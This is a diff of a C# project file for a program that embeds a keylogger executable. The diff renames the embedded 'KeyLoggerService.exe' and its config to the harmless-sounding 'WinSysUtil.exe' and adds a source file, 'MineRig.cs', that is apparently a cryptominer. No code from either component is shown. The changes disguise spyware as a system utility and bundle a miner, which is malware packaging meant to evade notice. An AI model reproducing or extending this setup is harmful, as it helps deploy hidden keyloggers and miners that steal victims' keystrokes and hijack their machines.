@@ -54,15 +54,16 @@
     <Reference Include="System.Xml" />
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="MineRig.cs" />
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
   </ItemGroup>
   <ItemGroup>
-    <EmbeddedResource Include="..\KeyLoggerService\bin\Release\KeyLoggerService.exe">
-      <Link>KeyLoggerService.exe</Link>
+    <EmbeddedResource Include="..\KeyLoggerService\bin\Release\WinSysUtil.exe">
+      <Link>WinSysUtil.exe</Link>
     </EmbeddedResource>
-    <EmbeddedResource Include="..\KeyLoggerService\bin\Release\KeyLoggerService.exe.config">
-      <Link>KeyLoggerService.exe.config</Link>
+    <EmbeddedResource Include="..\KeyLoggerService\bin\Release\WinSysUtil.exe.config">
+      <Link>WinSysUtil.exe.config</Link>
     </EmbeddedResource>
   </ItemGroup>
   <ItemGroup>
